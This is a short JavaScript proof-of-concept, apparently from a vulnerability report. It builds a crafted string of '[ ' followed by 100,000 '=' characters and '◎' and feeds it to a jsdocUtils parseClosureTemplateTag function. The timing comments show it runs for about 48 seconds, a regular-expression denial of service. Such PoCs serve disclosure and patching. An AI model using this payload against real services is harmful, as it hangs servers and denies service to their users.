import { parseClosureTemplateTag } from "./jsdocUtils.js";

//Attack String :"[ "+"="*100000+"◎"
var str = "[ ";
for (var i = 0; i < 100000; i++) {
  str += "=";
}
str += "◎";

const tag = {
  name: str,
};
console.log(parseClosureTemplateTag(tag));

// real    0m47.802s
// user    0m47.785s
// sys     0m0.000s